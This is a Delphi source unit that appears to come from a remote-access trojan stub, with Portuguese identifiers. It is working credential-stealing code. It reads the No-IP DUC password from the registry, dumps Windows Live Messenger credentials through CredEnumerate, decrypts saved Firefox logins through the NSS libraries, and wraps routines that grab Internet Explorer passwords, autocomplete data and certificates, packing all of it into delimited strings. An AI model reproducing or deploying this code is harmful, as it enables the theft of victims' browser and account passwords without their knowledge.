unit UnitPasswords;

interface

uses
  StrUtils,windows,
  IEpasswords,
  uRASReader,
  uIE7_decode,
  Base64,
  StubFuncoesDiversas;

  function GetFirefoxPasswords(Delimitador: string): string;
  function GetWindowsLiveMessengerPasswords(Delimitador: string): string;
  function noip_DUCpasswords(Delimitador: string): string;
  function GetIELoginPass(Delimitador: string): string;
  function GrabAllIEpasswords(Delimitador: string): string;
  function ShowAllIeAutocompletePWs(Delimitador: string): string;
  function ShowAllIEWebCert(Delimitador: string): string;
  function xShowIEAutoCompletePlain(Delimitador: string): string;
implementation

var
  Programfiles: string;
  
function xShowIEAutoCompletePlain(Delimitador: string): string;
begin
  result := ShowIEAutoCompletePlain(Delimitador);
end;

function isIE7or8: boolean;
var
  s: string;
begin
  result := false;
  s := lerreg(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Internet Explorer', 'Version', '');
  if length(s) <= 0 then exit;
  if (s[1] <> '7') and (s[1] <> '8') and (s[1] <> '9') then exit;
  result := true;
end;

function GetIELoginPass(Delimitador: string): string;
begin
  result := GetLoginPass(Delimitador);
end;

function GrabAllIEpasswords(Delimitador: string): string;
begin
  result := GrabIEpasswords(Delimitador);
end;

function ShowAllIeAutocompletePWs(Delimitador: string): string;
begin
  result := '';
  if isIE7or8 = true then result := ShowIeAutocompletePWs(Delimitador);
end;

function ShowAllIEWebCert(Delimitador: string): string;
begin
  result := '';
  if isIE7or8 = true then result := ShowIEWebCert(Delimitador);
end;

function noip_DUCpasswords(Delimitador: string): string;
var
  UserName, Host, Senha: string;
begin
  UserName := lerreg(HKEY_LOCAL_MACHINE, 'SOFTWARE\Vitalwerks\DUC', 'UserName', '');
  Senha := lerreg(HKEY_LOCAL_MACHINE, 'SOFTWARE\Vitalwerks\DUC', 'Password', '');
  if username = '' then result := '' else
  Result := 'No-ip DUC' + Delimitador + UserName + Delimitador + Base64Decode(Senha) + Delimitador + #13#10;
end;

/////////// MSN //////////////////
type
  PTChar = ^Char;

type
  _CREDENTIAL_ATTRIBUTEA = record
    Keyword: LPSTR;
    Flags: DWORD;
    ValueSize: DWORD;
    Value: PBYTE;
  end;
  PCREDENTIAL_ATTRIBUTE = ^_CREDENTIAL_ATTRIBUTEA;

 _CREDENTIALA = record
    Flags: DWORD;
    Type_: DWORD;
    TargetName: LPSTR;
    Comment: LPSTR;
    LastWritten: FILETIME;
    CredentialBlobSize: DWORD;
    CredentialBlob: PBYTE;
    Persist: DWORD;
    AttributeCount: DWORD;
    Attributes: PCREDENTIAL_ATTRIBUTE;
    TargetAlias: LPSTR;
    UserName: LPSTR;
  end;
  PCREDENTIAL = array of ^_CREDENTIALA;

  _CRYPTPROTECT_PROMPTSTRUCT = record
    cbSize: DWORD;
    dwPromptFlags: DWORD;
    hwndApp: HWND;
    szPrompt: LPCWSTR;
  end;
  PCRYPTPROTECT_PROMPTSTRUCT = ^_CRYPTPROTECT_PROMPTSTRUCT;

  _CRYPTOAPI_BLOB = record
    cbData: DWORD;
    pbData: PBYTE;
  end;
  DATA_BLOB = _CRYPTOAPI_BLOB;
  PDATA_BLOB = ^DATA_BLOB;


var
 CredEnumerate: function(Filter: LPCSTR; Flags: DWORD; var Count: DWORD; var Credential: PCREDENTIAL): BOOL; stdcall;
 CredFree: function(Buffer: Pointer): BOOL; stdcall;
/////////// FIM MSN //////////////////

function DumpData(Buffer: Pointer; BufLen: DWord): String;
var
  i, j, c: Integer;
begin
  c := 0;
Result := '';
  for i := 1 to BufLen div 16 do begin
    for j := c to c + 15 do
      if (PByte(Integer(Buffer) + j)^ < $20) or (PByte(Integer(Buffer) + j)^ > $FA) then
        Result := Result
      else
        Result := Result + PTChar(Integer(Buffer) + j)^;
    c := c + 16;
  end;
  if BufLen mod 16 <> 0 then begin
    for i := BufLen mod 16 downto 1 do begin
      if (PByte(Integer(Buffer) + Integer(BufLen) - i)^ < $20) or (PByte(Integer(Buffer) + Integer(BufLen) - i)^ > $FA) then
        Result := Result
      else
        Result := Result + PTChar(Integer(Buffer) + Integer(BufLen) - i)^;
        end;
  end;
end;

function GetWindowsLiveMessengerPasswords(Delimitador: string): string;
var
  CredentialCollection: PCREDENTIAL;
  Count, i: DWORD;
  Handle: THandle;
begin
  Result := '';
  Handle := LoadLibrary('advapi32.dll');
  {$IFDEF UNICODE}
  @CredEnumerate := GetProcAddress(Handle, 'CredEnumerateW');
  {$ELSE}
  @CredEnumerate := GetProcAddress(Handle, 'CredEnumerateA');
  {$ENDIF UNICODE}
  @CredFree := GetProcAddress(Handle, 'CredFree');

  CredEnumerate('WindowsLive:name=*', 0, Count, CredentialCollection);
  if Count = 0 then exit;
  for I := 0 to count - 1 do begin
    Result := Result + 'Messenger' + Delimitador + CredentialCollection[i].UserName + Delimitador;
    Result := Pchar(Result + DumpData(CredentialCollection[i].CredentialBlob, CredentialCollection[i].CredentialBlobSize) + Delimitador + #13#10);
  end;
  FreeLibrary(Handle);
end;

function GetFirefoxPasswords(Delimitador: string): string;
type
  TSECItem = packed record
    SECItemType: dword;
    SECItemData: pchar;
    SECItemLen: dword;
  end;
  PSECItem = ^TSECItem;
var
  NSSModule: THandle;
  NSS_Init: function(configdir: pchar): dword; cdecl;
  NSSBase64_DecodeBuffer: function(arenaOpt: pointer; outItemOpt: PSECItem; inStr: pchar; inLen: dword): dword; cdecl;
  PK11_GetInternalKeySlot: function: pointer; cdecl;
  PK11_Authenticate: function(slot: pointer; loadCerts: boolean; wincx: pointer): dword; cdecl;
  PK11SDR_Decrypt: function(data: PSECItem; result: PSECItem; cx: pointer): dword; cdecl;
  NSS_Shutdown: procedure; cdecl;
  PK11_FreeSlot: procedure(slot: pointer); cdecl;
  UserenvModule: THandle;
  GetUserProfileDirectory: function(hToken: THandle; lpProfileDir: pchar; var lpcchSize: dword): longbool; stdcall;
  hToken: THandle;
  FirefoxProfilePath: pchar;
  MainProfile: array [0..MAX_PATH] of char;
  MainProfilePath: pchar;
  PasswordFile: THandle;
  PasswordFileSize: dword;
  PasswordFileData: pchar;
  Passwords: string;
  BytesRead: dword;
  CurrentEntry: string;
  Site: string;
  Name: string;
  Value: string;
  KeySlot: pointer;
  EncryptedSECItem: TSECItem;
  DecryptedSECItem: TSECItem;
  LoadLib: array [0..6] of cardinal;
  i: integer;
  TempStr, s: string;
begin
  if Programfiles = '' then Programfiles := GetProgramFilesDir;
  result := '';

  LoadLib[0] := LoadLibrary(pchar(ProgramFiles + '\Mozilla Firefox\' + 'mozcrt19.dll'));
  LoadLib[1] := LoadLibrary(pchar(ProgramFiles + '\Mozilla Firefox\' + 'sqlite3.dll'));
  LoadLib[2] := LoadLibrary(pchar(ProgramFiles + '\Mozilla Firefox\' + 'nspr4.dll'));
  LoadLib[3] := LoadLibrary(pchar(ProgramFiles + '\Mozilla Firefox\' + 'plc4.dll'));
  LoadLib[4] := LoadLibrary(pchar(ProgramFiles + '\Mozilla Firefox\' + 'plds4.dll'));
  LoadLib[5] := LoadLibrary(pchar(ProgramFiles + '\Mozilla Firefox\' + 'nssutil3.dll'));
  LoadLib[6] := LoadLibrary(pchar(ProgramFiles + '\Mozilla Firefox\' + 'softokn3.dll'));
  NSSModule := LoadLibrary(pchar(ProgramFiles + '\Mozilla Firefox\' + 'nss3.dll'));

  @NSS_Init := GetProcAddress(NSSModule, 'NSS_Init');
  if @NSS_Init = nil then begin result := ''; for i := 0 to 6 do try FreeLibrary(LoadLib[i]); FreeLibrary(NSSModule);except end; exit; end;

  @NSSBase64_DecodeBuffer := GetProcAddress(NSSModule, 'NSSBase64_DecodeBuffer');
  if @NSSBase64_DecodeBuffer = nil then begin result := ''; for i := 0 to 6 do try FreeLibrary(LoadLib[i]); FreeLibrary(NSSModule);except end; exit; end;

  @PK11_GetInternalKeySlot := GetProcAddress(NSSModule, 'PK11_GetInternalKeySlot');
  if @PK11_GetInternalKeySlot = nil then begin result := ''; for i := 0 to 6 do try FreeLibrary(LoadLib[i]); FreeLibrary(NSSModule);except end; exit; end;

  @PK11_Authenticate := GetProcAddress(NSSModule, 'PK11_Authenticate');
  if @PK11_Authenticate = nil then begin result := ''; for i := 0 to 6 do try FreeLibrary(LoadLib[i]); FreeLibrary(NSSModule);except end; exit; end;

  @PK11SDR_Decrypt := GetProcAddress(NSSModule, 'PK11SDR_Decrypt');
  if @PK11SDR_Decrypt = nil then begin result := ''; for i := 0 to 6 do try FreeLibrary(LoadLib[i]); FreeLibrary(NSSModule);except end; exit; end;

  @NSS_Shutdown := GetProcAddress(NSSModule, 'NSS_Shutdown');
  if @NSS_Shutdown = nil then begin result := ''; for i := 0 to 6 do try FreeLibrary(LoadLib[i]); FreeLibrary(NSSModule);except end; exit; end;

  @PK11_FreeSlot := GetProcAddress(NSSModule, 'PK11_FreeSlot');
  if @PK11_FreeSlot = nil then begin result := ''; for i := 0 to 6 do try FreeLibrary(LoadLib[i]); FreeLibrary(NSSModule);except end; exit; end;

  UserenvModule := LoadLibrary('userenv.dll');

  @GetUserProfileDirectory := GetProcAddress(UserenvModule, 'GetUserProfileDirectoryA');
  OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken);
  FirefoxProfilePath := pchar(GetAppDataDir + '\Mozilla\Firefox\'  + 'profiles.ini');
  GetPrivateProfileString('Profile0', 'Path', '', MainProfile, MAX_PATH, FirefoxProfilePath);
  if fileexists(pchar(GetAppDataDir + '\Mozilla\Firefox\' + MainProfile  + '\signons3.txt')) = true then
  MainProfilePath := pchar(GetAppDataDir + '\Mozilla\Firefox\' + MainProfile  + '\signons3.txt') else
  if fileexists(pchar(GetAppDataDir + '\Mozilla\Firefox\' + MainProfile  + '\signons2.txt')) = true then
  MainProfilePath := pchar(GetAppDataDir + '\Mozilla\Firefox\' + MainProfile  + '\signons2.txt') else
  if fileexists(pchar(GetAppDataDir + '\Mozilla\Firefox\' + MainProfile  + '\signons1.txt')) = true then
  MainProfilePath := pchar(GetAppDataDir + '\Mozilla\Firefox\' + MainProfile  + '\signons1.txt') else
  if fileexists(pchar(GetAppDataDir + '\Mozilla\Firefox\' + MainProfile  + '\signons.txt')) = true then
  MainProfilePath := pchar(GetAppDataDir + '\Mozilla\Firefox\' + MainProfile  + '\signons.txt') else
  begin
    result := '';
    exit;
  end;

  PasswordFile := CreateFile(MainProfilePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  PasswordFileSize := GetFileSize(PasswordFile, nil);
  GetMem(PasswordFileData, PasswordFileSize);
  ReadFile(PasswordFile, PasswordFileData^, PasswordFileSize, BytesRead, nil);
  CloseHandle(PasswordFile);
  Passwords := PasswordFileData;
  FreeMem(PasswordFileData);
  Delete(Passwords, 1, posex('.' + #13#10, Passwords) + 2);

  if NSS_Init(pchar(GetAppDataDir + '\Mozilla\Firefox\'  +  MainProfile)) = 0 then
  begin
    KeySlot := PK11_GetInternalKeySlot;
    if KeySlot <> nil then
    begin
      if PK11_Authenticate(KeySlot, True, nil) = 0 then
      begin
        while Length(Passwords) <> 0 do
        begin
          CurrentEntry := Copy(Passwords, 1, posex('.' + #13#10, Passwords) - 1);
          Delete(Passwords, 1, Length(CurrentEntry) + 3);
          Site := Copy(CurrentEntry, 1, posex(#13#10, CurrentEntry) - 1);
          Delete(CurrentEntry, 1, Length(Site) + 2);
          TempStr := TempStr + Site + Delimitador;
          while Length(CurrentEntry) <> 0 do
          begin
            Name := Copy(CurrentEntry, 1, posex(#13#10, CurrentEntry) - 1);
            Delete(CurrentEntry, 1, Length(Name) + 2);
            Value := Copy(CurrentEntry, 1, posex(#13#10, CurrentEntry) - 1);
            Delete(CurrentEntry, 1, Length(Value) + 2);
            NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Value), Length(Value));
            if PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil) = 0 then
            begin
              TempStr := TempStr + DecryptedSECItem.SECItemData + Delimitador;
            end;
          end;
          TempStr := TempStr + #13#10;
        end;
      end;
      PK11_FreeSlot(KeySlot);
    end;
    NSS_Shutdown;
  end;
  while TempStr <> '' do
  begin
    s := copy(TempStr, 1, posex(#13#10, TempStr) - 1);
    delete(TempStr, 1, posex(#13#10, TempStr) + 1);
    Site := copy(s, 1, posex(Delimitador, s) - 1) + delimitador;
    delete(s, 1, posex(delimitador, s) - 1);
    delete(s, 1, length(delimitador));
    while s <> '' do
    begin
      Name := copy(s, 1, posex(delimitador, s) - 1) + delimitador;
      delete(s, 1, posex(delimitador, s) - 1);
      delete(s, 1, length(delimitador));
      Value := copy(s, 1, posex(delimitador, s) - 1) + delimitador;
      delete(s, 1, posex(delimitador, s) - 1);
      delete(s, 1, length(delimitador));
      result := Result + Site + Name + value + #13#10;
    end;
  end;
  for i := 0 to 6 do try FreeLibrary(LoadLib[i]); FreeLibrary(NSSModule); except end;
end;

end.
